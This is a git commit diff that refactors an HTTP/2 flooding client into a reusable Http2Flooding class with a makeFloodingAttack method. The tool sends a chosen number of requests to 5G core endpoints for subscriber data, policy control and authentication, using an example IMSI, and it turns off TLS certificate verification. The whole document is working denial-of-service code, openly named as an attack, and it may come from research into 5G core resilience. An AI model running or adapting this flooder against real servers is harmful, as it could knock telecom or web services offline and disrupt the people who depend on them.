994569248d6ac15530117127949869b9389ca243
franckccv <francescocaccavale95@gmail.com>
2023-02-09 12:27:12 +0100

    Class added

--- src/client.js
+++ src/client.js
@@ -1,37 +1,34 @@
 const http2 = require('http2');
 const fs = require('fs');
-const args = process.argv.slice(2);
-if(args.length!=3){
-  console.log("Insert ip - port - number of requests ");
-  process.exit(1);
+const Http2Flooding=require('./http2flooding')
+
+
+function main(){
+  const args = process.argv.slice(2);
+  if(args.length!=4){
+    console.log("Insert ip - port - number of requests - http method");
+    process.exit(1);
+  }
+
+  const http_methods=['POST','GET','DELETE','PUT'];
+  var http_method_path ={
+    "GET":"/nudm-sdm/v2/imsi-460020301001001?dataset-names=AM,SMF_SEL",
+    "POST":"/nudm-sdm/v2/imsi-460020301001001/sdm-subscriptions",
+    "DELETE":"/npcf-am-policy-control/v1/policies/PolAssoId31",
+    "PUT":"/nausf-auth/v1/ue-authentications/imsi-460020301001001/5g-aka-confirmation"
+
+  }
+  const [ip, port, numberOfRequests ] = args.slice(0,3);
+  var method=args[3];
+  if(!http_methods.includes(method)){
+    console.log("",method);
+    console.log("Insert a correct method:POST GET DELETE PUT");
+    process.exit(1);
+  }
+  const http2flooding = new Http2Flooding(ip, port, numberOfRequests);
+  const client=http2flooding.connectToServer();
+  http2flooding.makeFloodingAttack(client,method,http_method_path[method]);
+
 }
-const [ip, port, numberOfRequests] = process.argv.slice(2);
 
-
-let address= 'https://'.concat(ip).concat(':').concat(port).concat('/');
-console.log("Address ",address);
-const client = http2.connect(address,{
-  
-  rejectUnauthorized: false,
-
-} );
-
-for (let i = 0; i < numberOfRequests; i++) {
-  const req = client.request({ ':path': '/' });
-
-  req.on('response', (headers, flags) => {
-    console.log(headers[':status']);
-  });
-let data='';
-  req.on('data', (chunk) => {
-    data += chunk;
-    console.log("Data Received");
-  });
-
-  req.on('end', () => {
-    client.close();
-  });
-  
-  req.end();
-  
-}
+main();
---
+++ src/http2flooding.js
@@ -0,0 +1,65 @@
+const http2 = require('http2');
+
+/**
+ * @param ip: it represents the ip address of the server
+ * @param port: it represents the port of the server
+ * @param numberOfRequests: it represents the number of requests for each thread
+ * 
+ * 
+ * 
+ */
+class Http2Flooding {
+     /**
+     *
+     * @param {string} ip
+     * @param {number} port
+     * @param  {number} numberOfRequests
+     */
+    ip;
+    port;
+    numberOfRequests;
+
+    constructor(ip, port,numberOfRequests) {
+      
+      this.ip = ip;  
+      this.port = port;
+      this.numberOfRequests=numberOfRequests
+    }
+/**
+ * It establishes a secure connection with http2 server
+ * Note that in this case there is no mutual authentication, but only one way authentication
+ * @returns  a ClientHttp2Session instance through the object client
+ * 
+ */
+    connectToServer(){
+      let address= 'https://'.concat(this.ip).concat(':').concat(this.port).concat('/');
+      const client = http2.connect(address,{
+        requestCert: false, // put true if you want a client certificate, tested and it works
+        rejectUnauthorized: false
+        });
+        return client;
+    }
+
+    makeFloodingAttack(client,method,path){
+      console.log("funzione :metodo",method," ",path);
+         for (let i = 0; i <  this.numberOfRequests ; i++) {
+           console.log(`Making request ${i + 1}...`);
+           const req = client.request({
+                  ':method': method,         
+                  ':path': path
+             });
+             req.on('response', (headers) => {
+                console.log(headers[':status']);
+              });
+              req.on('end', () => {
+                client.close();
+              });
+              req.end();
+      }
+    }
+
+      
+  }
+
+  //it exports the class as a library to be used by other files
+  module.exports = Http2Flooding;
